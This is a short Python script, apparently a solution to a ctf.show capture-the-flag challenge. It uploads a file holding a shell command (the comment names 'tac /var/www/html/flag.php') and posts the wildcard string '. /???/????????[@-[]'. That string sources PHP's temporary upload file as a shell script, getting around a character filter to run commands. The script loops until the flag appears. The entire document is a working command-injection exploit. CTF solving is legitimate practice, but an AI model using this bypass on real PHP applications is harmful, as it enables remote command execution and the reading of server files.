import requests
import time
url = "https://6eb2ddc0-561f-4ba7-8953-ab9f178569ba.challenge.ctf.show/"

#payload.txt 内容为需要执行的命令 这里为 tac /var/www/html/flag.php
file = {"file": open("payload.txt", "r")}

data = {"code": ". /???/????????[@-[]"}

while True:
    response = requests.post(url, files=file, data=data, verify=False)
    if response.text.find("CTF{")!= -1:
        flag = response.text[response.text.find("CTF{"):-1]
        print(flag)
        break
    else:
        print("Waiting for flag...")
        #time.sleep(1)
